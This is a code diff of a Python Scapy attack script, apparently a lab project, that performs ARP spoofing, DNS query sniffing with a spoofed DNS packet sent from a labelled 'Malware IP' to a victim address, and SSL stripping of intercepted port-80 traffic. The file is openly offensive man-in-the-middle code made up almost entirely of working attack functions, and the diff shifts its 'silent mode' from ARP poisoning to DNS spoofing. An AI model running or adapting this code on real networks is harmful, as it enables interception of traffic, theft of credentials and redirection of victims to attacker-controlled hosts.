@@ -1,14 +1,16 @@
 from scapy.all import *
 import time
 
+ipM1 = "192.168.56.101" #  Rename to IPAttacker? 
+ipM2 = "192.168.56.102"
+ipM3 = "192.168.56.103" # IPVictim?
+ipMal = "50.63.7.226"   # Malware IP
+trapUrl = 'google.com'
+
 def ARP_spoofing():
     macM1 = "08:00:27:b7:c4:af"
     macM2 = "08:00:27:CC:28:6f"
     macM3 = "08:00:27:d0:25:4b"
-
-    ipM1 = "192.168.56.101"
-    ipM2 = "192.168.56.102"
-    ipM3 = "192.168.56.103"
 
     arp_M1 = Ether() / ARP()
     arp_M1[Ether].src = macM3
@@ -25,6 +27,17 @@ def ARP_spoofing():
     arp_M2[ARP].pdst = ipM2
     sendp(arp_M1, iface = "enp0s3")
     sendp(arp_M2, iface = "enp0s3")
+
+# DNS-Spoof Attack
+def dns_spoof_attack():
+    packets = sniff(filter='udp port 53', count=1)
+    for packet in packets:
+        if packet.haslayer(DNS):
+            dns_packet = packet[DNS]
+            print("DNS Query: ", dns_packet.qd.qname)
+            # print("DNS Response: ", dns_packet.an.rdata)
+            
+    dns_p1 = IP(src=ipMal, dst=ipM3) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=trapUrl))
 
 # SSL strip one packet
 def ssl_strip(packet):
@@ -43,14 +56,6 @@ def ssl_strip(packet):
 
             send(packet, verbose=0)
 
-def dns_spoof_attack():
-    packets = sniff(filter='udp port 53', count=10)
-    for packet in packets:
-        if packet.haslayer(DNS):
-            dns_packet = packet[DNS]
-            print("DNS Query: ", dns_packet.qd.qname)
-            print("DNS Response: ", dns_packet.an.rdata)
-
 def ssl_strip_attack():
     # prn = function to apply to each sniffed packet
     sniff(filter="tcp and port 80", prn=ssl_strip)
@@ -60,9 +65,9 @@ def ssl_strip_attack():
 
 def silent_mode():
     try:
-        while True:
-            ARP_spoofing()
-            time.sleep(20)
+        # while True:
+        #     ARP
+        dns_spoof_attack()
     except KeyboardInterrupt:
         pass
 
@@ -84,6 +89,4 @@ if __name__ == "__main__":
         all_out_mode()
     else:
         print("Input error!")
-
-dns_spoof_attack()
         
